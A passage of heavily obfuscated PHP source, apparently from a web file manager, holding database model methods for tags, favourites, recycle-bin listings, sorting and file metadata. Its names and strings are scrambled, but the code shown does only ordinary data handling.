$c®ÃÀêŸ¨‚) { $eê˜›‡ƒì• =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->getByTagID($b±∑◊⁄Ñé”, $c®ÃÀêŸ¨‚) || !$F«£åàÇï») { return !1; } if (!Model($eê˜›‡ƒì•[803])->pathInfo($F«£åàÇï»)) { return !1; } $eçîîÀ†ëù = array($eê˜›‡ƒì•[1529] => 0, $eê˜›‡ƒì•[464] => $c®ÃÀêŸ¨‚, $eê˜›‡ƒì•[415] => $F«£åàÇï», $eê˜›‡ƒì•[416] => $eê˜›‡ƒì•[1822] . $b±∑◊⁄Ñé”, $eê˜›‡ƒì•[414] => $eê˜›‡ƒì•[33], $eê˜›‡ƒì•[1711] => 0); if ($this->where($eçîîÀ†ëù)->find()) { return !1; } return $this->add($eçîîÀ†ëù); } protected function removeFromTag($DÚÍéÊÖ–Ø, $Cò©’Õ ◊à, $F∑ãü·ç‘») { $Dä´àìå…° =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->getByTagID($DÚÍéÊÖ–Ø, $F∑ãü·ç‘») || !$Cò©’Õ ◊à) { return !1; } if (is_array($Cò©’Õ ◊à)) { $Cò©’Õ ◊à = array($Dä´àìå…°[7], $Cò©’Õ ◊à); } $D¢ö≈ú∑ƒ© = array($Dä´àìå…°[1529] => 0, $Dä´àìå…°[464] => $F∑ãü·ç‘», $Dä´àìå…°[416] => $Dä´àìå…°[1822] . $DÚÍéÊÖ–Ø, $Dä´àìå…°[415] => $Cò©’Õ ◊à); return $this->where($D¢ö≈ú∑ƒ©)->delete(); } protected function removeByTag($aƒ°∆ñ¡™®, $eÌ∞®øÉñà) { $fπííŸ…‚ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->getByTagID($aƒ°∆ñ¡™®, $eÌ∞®øÉñà)) { return !1; } $a˜òÛô¯ÖØ = array($fπííŸ…‚[1529] => 0, $fπííŸ…‚[464] => $eÌ∞®øÉñà, $fπííŸ…‚[416] => $fπííŸ…‚[1822] . $aƒ°∆ñ¡™®); return $this->where($a˜òÛô¯ÖØ)->delete(); } protected function removeBySource($Cﬂó∏œÁñÿ, $cåÕÕù∞≈â) { $fÕ® ãÒ„õ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$Cﬂó∏œÁñÿ || !$cåÕÕù∞≈â) { return !1; } if (is_array($cåÕÕù∞≈â)) { $cåÕÕù∞≈â = array($fÕ® ãÒ„õ[7], $cåÕÕù∞≈â); } $CÔ€°ÈÈ◊¶ = array($fÕ® ãÒ„õ[1529] => 0, $fÕ® ãÒ„õ[415] => $cåÕÕù∞≈â, $fÕ® ãÒ„õ[464] => array($fÕ® ãÒ„õ[982], 0), $fÕ® ãÒ„õ[416] => $fÕ® ãÒ„õ[1822] . $Cﬂó∏œÁñÿ); return $this->where($CÔ€°ÈÈ◊¶)->delete(); } } goto BÎâ‚¶Ñ™ã; B‡Ù«Í»ª¬: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\162\143\145"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\155\x65" => "\x69\157\x5f\x73\157\x75\x72\143\145\137\155\145\x74\x61", "\x6d\145\164\141\x46\151\x65\x6c\x64" => "\x73\x6f\x75\x72\x63\x65\x49\104"); protected $dataAuto = array(array("\155\157\144\151\x66\171\124\x69\x6d\145", "\164\x69\x6d\145", "\151\156\x73\145\x72\164", "\146\x75\x6e\x63\x74\151\x6f\x6e"), array("\143\162\x65\x61\x74\x65\x54\x69\x6d\145", "\164\x69\155\x65", "\x69\x6e\163\145\x72\164", "\146\x75\x6e\143\164\151\x6f\156"), array("\x76\151\x65\x77\124\x69\x6d\x65", "\164\151\155\x65", "\x69\x6e\x73\x65\162\x74", "\x66\165\156\x63\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($F∂ÉÙ‹œñ„) { return $this->listSource(array($_SERVER[Öíæ€“”≠éÏË][395] => $F∂ÉÙ‹œñ„)); } public function typeName($F…üÁµËÿˆ) { static $Eç›Â—’Ωπ = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\145\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\x72\157\165\x70"); return $Eç›Â—’Ωπ[$F…üÁµËÿˆ . $_SERVER[Öíæ€“”≠éÏË][33]]; } public function sourceListInfo($b•»«◊‚€¢, $b≈»ãÎ‹ºà = false) { goto EêÏπø≤µ±; Cí÷ÙÓ—ﬁ∫: if (!$b•»«◊‚€¢) { return array(); } $A≠€Ã≠Ñ•Õ = $this->where(array($c¶™Æâ£àØ[396] => array($c¶™Æâ£àØ[7], $b•»«◊‚€¢)))->select(); $this->_listDataApply($A≠€Ã≠Ñ•Õ, $b≈»ãÎ‹ºà); goto C‰≤∑ı∂ø‡; C‰≤∑ı∂ø‡: return array_to_keyvalue($A≠€Ã≠Ñ•Õ, $c¶™Æâ£àØ[396]); goto cﬂå¡Œ·˜å; EêÏπø≤µ±: $c¶™Æâ£àØ =& $_SERVER[Öíæ€“”≠éÏË]; $b•»«◊‚€¢ = $b•»«◊‚€¢ ? $b•»«◊‚€¢ : array(); $b•»«◊‚€¢ = array_filter(array_unique($b•»«◊‚€¢)); goto Cí÷ÙÓ—ﬁ∫; cﬂå¡Œ·˜å: } public function pathInfoFilter(&$aÛ…»·˘ñ•) { goto e÷Ç¨ÿÈÊò; eù‘Úª≈Òø: static $dÿˆﬂçóåÊ = false; if (!$DÁƒÈçè≤á) { goto CÖ≤˘‹ÌÑå; A¢íÙ¥·ùµ: $b·¯π∫≈ﬂ = array(); foreach ($DÁƒÈçè≤á as $fÌøÑˆõ§Ï) { if (in_array($fÌøÑˆõ§Ï, $fÉ÷Ø§ã¥ˆ)) { continue; } $b·¯π∫≈ﬂ[] = $fÌøÑˆõ§Ï; } $dÿˆﬂçóåÊ = explode($c∑ûÁÿ®ø[47], $c∑ûÁÿ®ø[401]); goto eﬁ°”êñÉ÷; eßﬁâ∑â™ : $FÒŒù∂Ù†√ = $c∑ûÁÿ®ø[400]; $fÉ÷Ø§ã¥ˆ = explode($c∑ûÁÿ®ø[47], $FÒŒù∂Ù†√); $DÁƒÈçè≤á = explode($c∑ûÁÿ®ø[47], $dó©ÀüâﬂÊ); goto A¢íÙ¥·ùµ; CÖ≤˘‹ÌÑå: $dó©ÀüâﬂÊ = $c∑ûÁÿ®ø[397]; $dó©ÀüâﬂÊ .= $c∑ûÁÿ®ø[398]; $dó©ÀüâﬂÊ .= $c∑ûÁÿ®ø[399]; goto eßﬁâ∑â™ ; eﬁ°”êñÉ÷: } foreach ($dÿˆﬂçóåÊ as $e¢™¢“ﬁ›ñ) { if (isset($aÛ…»·˘ñ•[$e¢™¢“ﬁ›ñ])) { $aÛ…»·˘ñ•[$e¢™¢“ﬁ›ñ] = intval($aÛ…»·˘ñ•[$e¢™¢“ﬁ›ñ]); } } goto CÏ›Íã·≠»; D‚∞Ø®ı•Ï: $aÛ…»·˘ñ• = array_field_key($aÛ…»·˘ñ•, $d∂¿π°ÓûÜ); return $aÛ…»·˘ñ•; goto b„ôÙ√èŒá; e÷Ç¨ÿÈÊò: $c∑ûÁÿ®ø =& $_SERVER[Öíæ€“”≠éÏË]; static $DÁƒÈçè≤á = false; static $b·¯π∫≈ﬂ = false; goto eù‘Úª≈Òø; CÏ›Íã·≠»: $aÛ…»·˘ñ•[$c∑ûÁÿ®ø[76]] = $c∑ûÁÿ®ø[402] . $aÛ…»·˘ñ•[$c∑ûÁÿ®ø[396]] . $c∑ûÁÿ®ø[403]; $aÛ…»·˘ñ•[$c∑ûÁÿ®ø[29]] = $aÛ…»·˘ñ•[$c∑ûÁÿ®ø[404]] == 1 ? $c∑ûÁÿ®ø[77] : $c∑ûÁÿ®ø[193]; $aÛ…»·˘ñ•[$c∑ûÁÿ®ø[405]] = $this->typeName($aÛ…»·˘ñ•[$c∑ûÁÿ®ø[405]]); goto AüîÁÚ¢äÖ; AüîÁÚ¢äÖ: if ($aÛ…»·˘ñ•[$c∑ûÁÿ®ø[404]] != 1) { $aÛ…»·˘ñ•[$c∑ûÁÿ®ø[168]] = $aÛ…»·˘ñ•[$c∑ûÁÿ®ø[406]]; unset($aÛ…»·˘ñ•[$c∑ûÁÿ®ø[406]]); } $d∂¿π°ÓûÜ = $DÁƒÈçè≤á; if (isset($aÛ…»·˘ñ•[$c∑ûÁÿ®ø[407]]) && $aÛ…»·˘ñ•[$c∑ûÁÿ®ø[407]][$c∑ûÁÿ®ø[408]] == -1) { $d∂¿π°ÓûÜ = $b·¯π∫≈ﬂ; } goto D‚∞Ø®ı•Ï; b„ôÙ√èŒá: } public function listUserFav() { goto BËÿÇË∫¶ß; cé≈‘…—ãà: foreach ($D‹Öì£ô¬Ã as &$b≈ÂÉäèÍ‰) { $b≈ÂÉäèÍ‰ = array($cÜ™≠“¶êñ[413] => $b≈ÂÉäèÍ‰[$cÜ™≠“¶êñ[394]], $cÜ™≠“¶êñ[414] => $b≈ÂÉäèÍ‰[$cÜ™≠“¶êñ[28]], $cÜ™≠“¶êñ[415] => $b≈ÂÉäèÍ‰[$cÜ™≠“¶êñ[76]], $cÜ™≠“¶êñ[416] => $b≈ÂÉäèÍ‰[$cÜ™≠“¶êñ[29]], $cÜ™≠“¶êñ[417] => $b≈ÂÉäèÍ‰[$cÜ™≠“¶êñ[194]], $cÜ™≠“¶êñ[418] => $b≈ÂÉäèÍ‰[$cÜ™≠“¶êñ[84]]); if ($b≈ÂÉäèÍ‰[$cÜ™≠“¶êñ[29]] == $cÜ™≠“¶êñ[410] && $dä∫ÖËâ˘Ë[$b≈ÂÉäèÍ‰[$cÜ™≠“¶êñ[76]]]) { $b≈ÂÉäèÍ‰[$cÜ™≠“¶êñ[85]] = $dä∫ÖËâ˘Ë[$b≈ÂÉäèÍ‰[$cÜ™≠“¶êñ[76]]]; } } unset($b≈ÂÉäèÍ‰); return $D‹Öì£ô¬Ã; goto b˘í°›î¢∞; BËÿÇË∫¶ß: $cÜ™≠“¶êñ =& $_SERVER[Öíæ€“”≠éÏË]; $D‹Öì£ô¬Ã = Model($cÜ™≠“¶êñ[409])->listData(); $a∞®¥Ü≤ªπ = array_filter_by_field($D‹Öì£ô¬Ã, $cÜ™≠“¶êñ[29], $cÜ™≠“¶êñ[410]); goto DüÀ›˜ñ¨ß; DüÀ›˜ñ¨ß: $a∞®¥Ü≤ªπ = array_to_keyvalue($a∞®¥Ü≤ªπ, $cÜ™≠“¶êñ[33], $cÜ™≠“¶êñ[76]); if ($a∞®¥Ü≤ªπ) { $dä∫ÖËâ˘Ë = $this->listSource(array($cÜ™≠“¶êñ[411] => array($cÜ™≠“¶êñ[412], $a∞®¥Ü≤ªπ))); } $dä∫ÖËâ˘Ë = array_to_keyvalue($dä∫ÖËâ˘Ë[$cÜ™≠“¶êñ[367]], $cÜ™≠“¶êñ[396]); goto cé≈‘…—ãà; b˘í°›î¢∞: } public function listUserTag($d–ŒÇ√Õ¥Ô) { goto bœﬁŸø•ß¨; c˜†àº≈“Â: $B÷‡™êÉéé = array_to_keyvalue($FÈÜ›Áƒ°õ[$BÊ’™ı—‡Ω[74]], $BÊ’™ı—‡Ω[33], $BÊ’™ı—‡Ω[396]); $eóÓŒÊÜ√ƒ = array_merge($B÷‡™êÉéé, $b‘ÕÃıÆ…ª); foreach ($eÀ™™˜πíç as $aﬂ«±§ü™˘) { if (!in_array($aﬂ«±§ü™˘, $eóÓŒÊÜ√ƒ)) { $c„æ•‚•»ª[] = $aﬂ«±§ü™˘; } } goto CÖ∑ãÒ«ìá; CÖ∑ãÒ«ìá: if ($c„æ•‚•»ª) { Model($BÊ’™ı—‡Ω[421])->removeBySource($c„æ•‚•»ª); } return $FÈÜ›Áƒ°õ; goto fûƒÁ√À¬∫; cºÿÙ‚‹äº: if (!$FÈÜ›Áƒ°õ || count($eÀ™™˜πíç) == $FÈÜ›Áƒ°õ[$BÊ’™ı—‡Ω[364]][$BÊ’™ı—‡Ω[365]]) { return $FÈÜ›Áƒ°õ; } $c„æ•‚•»ª = array(); $b‘ÕÃıÆ…ª = array_to_keyvalue($FÈÜ›Áƒ°õ[$BÊ’™ı—‡Ω[75]], $BÊ’™ı—‡Ω[33], $BÊ’™ı—‡Ω[396]); goto c˜†àº≈“Â; BôÈË—ŸÉ©: foreach ($câ…ÿß°òç as $fãú…®Æä´ => $cÈÙŒÖÜñ∆) { $c—Ö›†Îß = !0; if (!$d–ŒÇ√Õ¥Ô) { $eÀ™™˜πíç[] = $fãú…®Æä´; continue; } foreach ($d–ŒÇ√Õ¥Ô as $f›ì∆÷Œﬁã) { if (!in_array($f›ì∆÷Œﬁã, $cÈÙŒÖÜñ∆)) { $c—Ö›†Îß = !1; break; } } if ($c—Ö›†Îß) { $eÀ™™˜πíç[] = $fãú…®Æä´; } } if (!$eÀ™™˜πíç) { return array(); } $FÈÜ›Áƒ°õ = $this->listSource(array($BÊ’™ı—‡Ω[411] => array($BÊ’™ı—‡Ω[412], $eÀ™™˜πíç))); goto cºÿÙ‚‹äº; a›ÌÉ∞É æ: $câ…ÿß°òç = array(); foreach ($c‘À›≥≤«∏ as $E•∑û»ˆáí) { $aﬂ«±§ü™˘ = $E•∑û»ˆáí[$BÊ’™ı—‡Ω[76]]; if (!$aﬂ«±§ü™˘) { continue; } if (!isset($câ…ÿß°òç[$aﬂ«±§ü™˘])) { $câ…ÿß°òç[$aﬂ«±§ü™˘] = array(); } $câ…ÿß°òç[$aﬂ«±§ü™˘][] = $E•∑û»ˆáí[$BÊ’™ı—‡Ω[420]]; } $eÀ™™˜πíç = array(); goto BôÈË—ŸÉ©; bœﬁŸø•ß¨: $BÊ’™ı—‡Ω =& $_SERVER[Öíæ€“”≠éÏË]; if ($d–ŒÇ√Õ¥Ô && !is_array($d–ŒÇ√Õ¥Ô)) { $d–ŒÇ√Õ¥Ô = array($d–ŒÇ√Õ¥Ô); } $c‘À›≥≤«∏ = Model($BÊ’™ı—‡Ω[419])->listData(); goto a›ÌÉ∞É æ; fûƒÁ√À¬∫: } public function listUserRecycle() { $f¯†⁄¶€†„ =& $_SERVER[Öíæ€“”≠éÏË]; $aŸ≈°™ëΩ€ = Model($f¯†⁄¶€†„[422])->listData(); if (!$aŸ≈°™ëΩ€) { return array(); } $Cµº¨ÆﬁÇ« = array($f¯†⁄¶€†„[411] => array($f¯†⁄¶€†„[412], $aŸ≈°™ëΩ€), $f¯†⁄¶€†„[423] => 1); return $this->listSource($Cµº¨ÆﬁÇ«); } public function listSource($Dàÿº∏¯ˆ—, $fŸæÎÜ€Ëµ = 3000) { goto Fæî¥ÁûÔŸ; C…öØ’ÀÑ‘: return $aíÜ êèÎÌ; goto cÇıï„Àﬁì; Fæî¥ÁûÔŸ: $bëØ»ìƒù´ =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($Dàÿº∏¯ˆ—[$bëØ»ìƒù´[424]])) { $Dàÿº∏¯ˆ—[$bëØ»ìƒù´[424]] = 0; } $B•∞êŸÌ∫Î = $bëØ»ìƒù´[425]; goto cñ¡Ñ±√Æ©; cñ¡Ñ±√Æ©: $aíÜ êèÎÌ = $this->field($B•∞êŸÌ∫Î)->_makeOrder()->where($Dàÿº∏¯ˆ—)->selectPage($fŸæÎÜ€Ëµ); $this->_listDataApply($aíÜ êèÎÌ[$bëØ»ìƒù´[367]]); $this->_listMake($aíÜ êèÎÌ); goto C…öØ’ÀÑ‘; cÇıï„Àﬁì: } protected function _makeOrder() { goto f∏∫≤Îûœ√; fµ™·ü§œâ: if ($E≈Éœï∑À– == $BîÇÏÏíí‰[28]) { } $aÇ™´¶ƒ˜‚ = $BîÇÏÏíí‰[438] . $EÏ‚¶∂Ω™Ö[$E≈Éœï∑À–] . $BîÇÏÏíí‰[50] . $bÃéËÚ÷–À[$fŒΩß´Í⁄∫]; return $this->order(rtrim(trim($aÇ™´¶ƒ˜‚), $BîÇÏÏíí‰[47])); goto FÀáßõìπÂ; dëë”ÿ‚±˘: $fŒΩß´Í⁄∫ = Input::get($BîÇÏÏíí‰[437], $BîÇÏÏíí‰[7], $DØ‡§Ê∆≠Ñ, array_keys($bÃéËÚ÷–À)); if (!in_array($E≈Éœï∑À–, array_keys($EÏ‚¶∂Ω™Ö))) { $E≈Éœï∑À– = $BîÇÏÏíí‰[28]; } if (!in_array($fŒΩß´Í⁄∫, array_keys($bÃéËÚ÷–À))) { $E≈Éœï∑À– = $BîÇÏÏíí‰[429]; } goto fµ™·ü§œâ; f∏∫≤Îûœ√: $BîÇÏÏíí‰ =& $_SERVER[Öíæ€“”≠éÏË]; $c™ã˜‘÷®Ã = Model($BîÇÏÏíí‰[426])->get($BîÇÏÏíí‰[427]); $DØ‡§Ê∆≠Ñ = Model($BîÇÏÏíí‰[426])->get($BîÇÏÏíí‰[428]); goto bÇæ´˘ŒøÁ; bÇæ´˘ŒøÁ: $bÃéËÚ÷–À = array($BîÇÏÏíí‰[429] => $BîÇÏÏíí‰[430], $BîÇÏÏíí‰[431] => $BîÇÏÏíí‰[432]); $EÏ‚¶∂Ω™Ö = array($BîÇÏÏíí‰[28] => $BîÇÏÏíí‰[28], $BîÇÏÏíí‰[78] => $BîÇÏÏíí‰[78], $BîÇÏÏíí‰[168] => $BîÇÏÏíí‰[406], $BîÇÏÏíí‰[433] => $BîÇÏÏíí‰[433], $BîÇÏÏíí‰[434] => $BîÇÏÏíí‰[435], $BîÇÏÏíí‰[194] => $BîÇÏÏíí‰[194], $BîÇÏÏíí‰[84] => $BîÇÏÏíí‰[84]); $E≈Éœï∑À– = Input::get($BîÇÏÏíí‰[436], $BîÇÏÏíí‰[7], $c™ã˜‘÷®Ã, array_keys($EÏ‚¶∂Ω™Ö)); goto dëë”ÿ‚±˘; FÀáßõìπÂ: } protected function _listDataApplyItem($céä‘≈àî´, $c¡íî¿ºÕ¬ = false) { $cï®Û©öÊ› = array($céä‘≈àî´); $this->_listDataApply($cï®Û©öÊ›, $c¡íî¿ºÕ¬); return $cï®Û©öÊ›[0]; } protected function _listDataApply(&$A∫·¨‰ÏÕ†, $aÔ„ãÔﬂıæ = false) { goto B÷Éà†Ê≤å; CàÖãè∞∫à: $A’¶ìƒıÃ¯ = array_unique($A’¶ìƒıÃ¯); $this->_listSourceCache($A∫·¨‰ÏÕ†); if (!$aÔ„ãÔﬂıæ) { $this->_listAppendMeta($A∫·¨‰ÏÕ†, $A’¶ìƒıÃ¯); $this->_listAppendFileMeta($A∫·¨‰ÏÕ†, $A’¶ìƒıÃ¯); $this->_listAppendChildren($A∫·¨‰ÏÕ†, $A’¶ìƒıÃ¯); } goto EπáßÏõ©ß; EπáßÏõ©ß: $this->_listAppendPath($A∫·¨‰ÏÕ†); $this->_listAppendAuth($A∫·¨‰ÏÕ†); $this->_listAppendSourceInfo($A∫·¨‰ÏÕ†, $A’¶ìƒıÃ¯); goto fóúÊôÔ¿⁄; B÷Éà†Ê≤å: $C£∆èÔ∞≠È =& $_SERVER[Öíæ€“”≠éÏË]; if (!$A∫·¨‰ÏÕ†) { $A∫·¨‰ÏÕ† = array(); return; } $A’¶ìƒıÃ¯ = array_to_keyvalue($A∫·¨‰ÏÕ†, $C£∆èÔ∞≠È[33], $C£∆èÔ∞≠È[396]); goto CàÖãè∞∫à; fóúÊôÔ¿⁄: $this->_listAppendUser($A∫·¨‰ÏÕ†); $this->_listFilterInfo($A∫·¨‰ÏÕ†, $aÔ„ãÔﬂıæ); $this->_listAppendAuthSecret($A∫·¨‰ÏÕ†); goto cçò–‚ê·¡; cçò–‚ê·¡: } protected function _listSourceCache($a‡ÊﬁªìÒµ) { $b¶í°éΩ‚” =& $_SERVER[Öíæ€“”≠éÏË]; foreach ($a‡ÊﬁªìÒµ as $B¶ΩßÉøﬂú) { self::$cacheSourceInfo[$b¶í°éΩ‚”[439] . $B¶ΩßÉøﬂú[$b¶í°éΩ‚”[396]]] = $B¶ΩßÉøﬂú; } } protected function _listFilterInfo(&$Aìƒ©ò«¡‰, $FõÀìà∆öÊ = false) { $Bƒâëâ¶·ö =& $_SERVER[Öíæ€“”≠éÏË]; foreach ($Aìƒ©ò«¡‰ as &$f˘âáéáâí) { $f˘âáéáâí = $this->pathInfoFilter($f˘âáéáâí); self::$cachePathInfo[$Bƒâëâ¶·ö[440] . intval($FõÀìà∆öÊ) . $Bƒâëâ¶·ö[441] . $f˘âáéáâí[$Bƒâëâ¶·ö[396]]] = $f˘âáéáâí; } unset($f˘âáéáâí); } protected function _listMake(&$aÏ¨≈˜ÕÍë) { $CêÍ°¬ä´Ô =& $_SERVER[Öíæ€“”≠éÏË]; $aÏ¨≈˜ÕÍë[$CêÍ°¬ä´Ô[75]] = array(); $aÏ¨≈˜ÕÍë[$CêÍ°¬ä´Ô[74]] = array(); foreach ($aÏ¨≈˜ÕÍë[$CêÍ°¬ä´Ô[367]] as $Fê⁄Ã–∂Ò≠) { $dòïıÓ≠å§ = $Fê⁄Ã–∂Ò≠[$CêÍ°¬ä´Ô[404]] == 1 ? $CêÍ°¬ä´Ô[75] : $CêÍ°¬ä´Ô[74]; $aÏ¨≈˜ÕÍë[$dòïıÓ≠å§][] = $Fê⁄Ã–∂Ò≠; } unset($aÏ¨≈˜ÕÍë[$CêÍ°¬ä´Ô[367]]); } protected function _listAppendMeta(&$Fÿâî∆‘≤—, $B‹—∂§§ø€) { goto a´Ãæ∑∏µÕ; D¨ÙâÕé ü: if (!$B¯¬Œá’ı…) { return; } $bÍèÚìÑ∆Ì = array($dÚÑ≠ÂîÓÂ[444], $dÚÑ≠ÂîÓÂ[445]); $CñÁ‘∞≥ã™ = array(); goto d≠†Ã§°√’; a´Ãæ∑∏µÕ: $dÚÑ≠ÂîÓÂ =& $_SERVER[Öíæ€“”≠éÏË]; $cƒ¡ã€øÁÌ = array($dÚÑ≠ÂîÓÂ[411] => array($dÚÑ≠ÂîÓÂ[412], $B‹—∂§§ø€)); $B¯¬Œá’ı… = Model($dÚÑ≠ÂîÓÂ[442])->field($dÚÑ≠ÂîÓÂ[443])->where($cƒ¡ã€øÁÌ)->select(); goto D¨ÙâÕé ü; d≠†Ã§°√’: foreach ($B¯¬Œá’ı… as $Fºçﬂµ±êã) { if (!isset($CñÁ‘∞≥ã™[$Fºçﬂµ±êã[$dÚÑ≠ÂîÓÂ[396]]])) { $CñÁ‘∞≥ã™[$Fºçﬂµ±êã[$dÚÑ≠ÂîÓÂ[396]]] = array(); } if (in_array($Fºçﬂµ±êã[$dÚÑ≠ÂîÓÂ[93]], $bÍèÚìÑ∆Ì)) { continue; } $CñÁ‘∞≥ã™[$Fºçﬂµ±êã[$dÚÑ≠ÂîÓÂ[396]]][$Fºçﬂµ±êã[$dÚÑ≠ÂîÓÂ[93]]] = $Fºçﬂµ±êã[$dÚÑ≠ÂîÓÂ[372]]; } foreach ($Fÿâî∆‘≤— as &$cπéº¯ˆ†≠) { $cπéº¯ˆ†≠[$dÚÑ≠ÂîÓÂ[446]] = !1; if (isset($CñÁ‘∞≥ã™[$cπéº¯ˆ†≠[$dÚÑ≠ÂîÓÂ[396]]])) { $cπéº¯ˆ†≠[$dÚÑ≠ÂîÓÂ[446]] = $CñÁ‘∞≥ã™[$cπéº¯ˆ†≠[$dÚÑ≠ÂîÓÂ[396]]]; } if ($this->fileIsLock($cπéº¯ˆ†≠) && $cπéº¯ˆ†≠[$dÚÑ≠ÂîÓÂ[407]]) { $Bß™ºÔ”ª€ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $cπéº¯ˆ†≠[$dÚÑ≠ÂîÓÂ[407]][$dÚÑ≠ÂîÓÂ[408]] = AuthModel::authDisable($cπéº¯ˆ†≠[$dÚÑ≠ÂîÓÂ[407]][$dÚÑ≠ÂîÓÂ[408]], $Bß™ºÔ”ª€); $cπéº¯ˆ†≠[$dÚÑ≠ÂîÓÂ[407]][$dÚÑ≠ÂîÓÂ[447]][$dÚÑ≠ÂîÓÂ[407]] = $cπéº¯ˆ†≠[$dÚÑ≠ÂîÓÂ[407]][$dÚÑ≠ÂîÓÂ[408]]; } } unset($cπéº¯ˆ†≠); goto fóıâŸ≤µÜ; fóıâŸ≤µÜ: } protected function _listAppendFileMeta(&$eîõüÓüÎ¡, $E≥ˆôÓîˆö) { goto E°åÀŒƒàø; EîêÂÉ∞‚…: foreach ($eîõüÓüÎ¡ as &$cåÔ§ÑÊƒÈ) { goto CÌãÂî∂Ëå; AãÛÇê¬∫ç: if (isset($cåÔ§ÑÊƒÈ[$Fµ€ìÚÇ ›[164]][$Fµ€ìÚÇ ›[163]])) { $cåÔ§ÑÊƒÈ[$Fµ€ìÚÇ ›[163]] = json_decode($cåÔ§ÑÊƒÈ[$Fµ€ìÚÇ ›[164]][$Fµ€ìÚÇ ›[163]], !0); unset($cåÔ§ÑÊƒÈ[$Fµ€ìÚÇ ›[164]][$Fµ€ìÚÇ ›[163]]); } goto b°Òùá‰Œ–; FÍà∏Ÿ¥ê√: unset($A∑Á€µÒø†[$b´ÉœÁ“≤Ë][$Fµ€ìÚÇ ›[76]]); $a”˜í‚ËﬂÍ = is_array($EÙé¡πÀ’ñ[$b´ÉœÁ“≤Ë]) ? $EÙé¡πÀ’ñ[$b´ÉœÁ“≤Ë] : array(); $cåÔ§ÑÊƒÈ[$Fµ€ìÚÇ ›[164]] = array_merge($a”˜í‚ËﬂÍ, $A∑Á€µÒø†[$b´ÉœÁ“≤Ë]); goto AãÛÇê¬∫ç; CÌãÂî∂Ëå: $b´ÉœÁ“≤Ë = $cåÔ§ÑÊƒÈ[$Fµ€ìÚÇ ›[448]]; if (!$b´ÉœÁ“≤Ë || !is_array($A∑Á€µÒø†[$b´ÉœÁ“≤Ë])) { continue; } $Bı°æî¯¿ç = $A∑Á€µÒø†[$b´ÉœÁ“≤Ë]; goto Cè¥Î·ˆ◊…; Cè¥Î·ˆ◊…: $Bı°æî¯¿ç[$Fµ€ìÚÇ ›[78]] = $cåÔ§ÑÊƒÈ[$Fµ€ìÚÇ ›[78]]; $Bı°æî¯¿ç[$Fµ€ìÚÇ ›[28]] = $cåÔ§ÑÊƒÈ[$Fµ€ìÚÇ ›[28]]; if (!isset(self::$cacheFileInfo[$Fµ€ìÚÇ ›[454] . $b´ÉœÁ“≤Ë])) { self::$cacheFileInfo[$Fµ€ìÚÇ ›[454] . $b´ÉœÁ“≤Ë] = array_merge(array(), $Bı°æî¯¿ç); } goto FÍà∏Ÿ¥ê√; b°Òùá‰Œ–: } unset($cåÔ§ÑÊƒÈ); goto EüΩÀûˆ ò; f®ö±·Ÿºê: $A∑Á€µÒø† = Model($Fµ€ìÚÇ ›[451])->field($fÖñÚ∞ê±—)->where($dπ¿∫ùä€Á)->select(); $A∑Á€µÒø† = array_to_keyvalue($A∑Á€µÒø†, $Fµ€ìÚÇ ›[448]); $fÑ∂î∂¯ëÒ = Model($Fµ€ìÚÇ ›[452])->field($Fµ€ìÚÇ ›[453])->where($dπ¿∫ùä€Á)->select(); goto Cå€Ô∞⁄ªä; Cå€Ô∞⁄ªä: $fÑ∂î∂¯ëÒ = $fÑ∂î∂¯ëÒ ? $fÑ∂î∂¯ëÒ : array(); $EÙé¡πÀ’ñ = array(); foreach ($fÑ∂î∂¯ëÒ as $b‘µ¨†úàÕ) { if (!isset($EÙé¡πÀ’ñ[$b‘µ¨†úàÕ[$Fµ€ìÚÇ ›[448]]])) { $EÙé¡πÀ’ñ[$b‘µ¨†úàÕ[$Fµ€ìÚÇ ›[448]]] = array(); } $EÙé¡πÀ’ñ[$b‘µ¨†úàÕ[$Fµ€ìÚÇ ›[448]]][$b‘µ¨†úàÕ[$Fµ€ìÚÇ ›[93]]] = $b‘µ¨†úàÕ[$Fµ€ìÚÇ ›[372]]; } goto EîêÂÉ∞‚…; cÁîêÎƒ—ö: if (!$BÚóﬂ∞Â†œ) { return; } $dπ¿∫ùä€Á = array($Fµ€ìÚÇ ›[449] => array($Fµ€ìÚÇ ›[412], $BÚóﬂ∞Â†œ)); $fÖñÚ∞ê±— = $Fµ€ìÚÇ ›[450]; goto f®ö±·Ÿºê; E°åÀŒƒàø: $Fµ€ìÚÇ › =& $_SERVER[Öíæ€“”≠éÏË]; $BÚóﬂ∞Â†œ = array_to_keyvalue($eîõüÓüÎ¡, $Fµ€ìÚÇ ›[33], $Fµ€ìÚÇ ›[448]); $BÚóﬂ∞Â†œ = array_filter(array_unique($BÚóﬂ∞Â†œ)); goto cÁîêÎƒ—ö; EüΩÀûˆ ò: } protected function _listAppendSourceInfo(&$Dä˘ÂÛùáË, $fè∑â⁄Ëµ–) { goto d˜ƒï‡»Á¬; cãÏ¬÷“Ω: $CåÉØŸ◊É∂ = Model($E¨¯ÿØÏ“ó[419])->listData(); $aÇ¶ ‰äÿ∆ = Model($E¨¯ÿØÏ“ó[409])->listData(); $b≥˘÷Ùîèµ = Model($E¨¯ÿØÏ“ó[457])->listSimple(); goto Dçä∏Ω∑û’; Däæ∑õ∏°é: return $Dä˘ÂÛùáË; goto f»¯êπÛã¿; cÕ…©éº≥ÿ: $E¡Ñö«ß•æ = array_to_keyvalue_group($b≥˘÷Ùîèµ, $E¨¯ÿØÏ“ó[396]); foreach ($Dä˘ÂÛùáË as &$CßíŸî÷Ç∂) { $CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[85]] = array($E¨¯ÿØÏ“ó[458] => 0, $E¨¯ÿØÏ“ó[459] => 0, $E¨¯ÿØÏ“ó[460] => 0); if (isset($AêıŒÍÔî¢[$CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[396]]])) { 